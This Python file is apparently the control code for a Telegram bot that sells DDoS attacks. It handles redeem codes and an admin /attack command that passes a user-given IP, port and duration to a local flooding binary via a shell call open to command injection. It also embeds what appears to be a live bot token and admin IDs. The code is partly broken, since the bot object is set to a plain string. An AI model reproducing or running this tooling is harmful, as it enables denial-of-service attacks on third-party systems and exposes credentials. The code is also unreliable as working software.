import os
import subprocess
import telebot
from telebot import types
import random
import time
from datetime import datetime, timedelta

# Configuration
BOT_TOKEN = "7818708282:AAFzCZxxO5PIzSis4bfGIXSIZeQi7XyonVg"
ADMIN_ID = '2117432792'  # Replace with your Telegram ID
CHANNEL_ID = "@https://t.me/sairajddos"  # Replace with your channel/group ID
REDEEM_CODES = {"VIP123": True, "FREE50": True}  # Redeem codes
approved_users = {}
user_attack_count = {}
max_threads = 10
max_time = 300  # Default max attack duration
admin_list = [2117432792]
daily_bonus = {}
leaderboard = {}

bot ="7818708282:AAFzCZxxO5PIzSis4bfGIXSIZeQi7XyonVg"

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if user_id in approved_users:
        bot.reply_to(message, "✅ You are already registered, @LIMON_BROTHER! Use /help for commands.")
    else:
        bot.reply_to(message, "🔑 Please enter a redeem code to access the bot, @LIMON_BROTHER! 🏆")

@bot.message_handler(func=lambda message: message.text in REDEEM_CODES)
def redeem(message):
    user_id = message.from_user.id
    if user_id in approved_users:
        bot.reply_to(message, "✅ You are already registered, @LIMON_BROTHER!")
    elif REDEEM_CODES.get(message.text, False):
        approved_users[user_id] = True
        del REDEEM_CODES[message.text]
        bot.reply_to(message, "🎉 Redeem successful, @LIMON_BROTHER! Use /help for commands. 🚀")
        send_welcome_message(message.from_user)
    else:
        bot.reply_to(message, "❌ Invalid or already used redeem code, @LIMON_BROTHER! 😢")

def send_welcome_message(user):
    text = f"🎉 Welcome {user.first_name}, @LIMON_BROTHER! 🎊\nHappy to have you here! 💥💯"
    bot.send_message(CHANNEL_ID, text)

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, "📜 Available Commands, @LIMON_BROTHER:\n/start - Register/Login 🛡️\n/redeem <code> - Redeem Access Code 🔑\n/attack <ip> <port> <time> - Launch Attack (Admin Only) ⚡\n/set_threads <count> - Set max threads (Admin Only) 🛠️\n/set_time <seconds> - Set max attack duration (Admin Only) ⏳\n/addadmin <user_id> - Add a new admin (Owner Only) 👑\n/bonus - Claim your daily bonus 🎁\n/luckydraw - Try your luck 🎰\n/leaderboard - Check top players 🏆")

@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    if user_id not in admin_list:
        bot.reply_to(message, "⛔ You are not authorized to use this command, @LIMON_BROTHER! 🚫")
        return
    try:
        _, ip, port, duration = message.text.split()
        duration = int(duration)
        if duration > max_time:
            bot.reply_to(message, f"⚠️ Max allowed time is {max_time} seconds, @LIMON_BROTHER")
            return
        command = f"./Sai {ip} {port} {duration}"
        subprocess.Popen(command, shell=True)
        bot.reply_to(message, f"🚀 Attack started on {ip}:{port} for {duration} seconds, @LIMON_BROTHER💣🔥")
        for remaining in range(duration, 0, -1):
            bot.send_message(user_id, f"⏳ Attack running... {remaining} sec left, @LIMON_BROTHER!")
            time.sleep(1)
        bot.send_message(user_id, "✅ Attack finished, @LIMON_BROTHER!")
        user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
        if user_attack_count[user_id] % 20 == 0:
            bot.send_message(user_id, "📸 Please submit a feedback screenshot in the group, @LIMON_BROTHER! 🏆")
    except Exception as e:
        bot.reply_to(message, "⚠️ Invalid format, @LIMON_BROTHER! Use: /attack <ip> <port> <time> ⚙️")

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Only the main owner can add new admins, @LIMON_BROTHER! 🚫")
        return
    try:
        new_admin = int(message.text.split()[1])
        if new_admin in admin_list:
            bot.reply_to(message, "❌ User is already an admin, @LIMON_BROTHER! 😎")
        else:
            admin_list.append(new_admin)
            bot.reply_to(message, f"👑 User {new_admin} has been added as an admin, @LIMON_BROTHER! 🎉")
    except:
        bot.reply_to(message, "⚠️ Invalid input, @LIMON_BROTHER! Use: /addadmin <user_id> ⚙️")

print("🤖 Bot is running... 🚀")
bot.polling(none_stop=True)
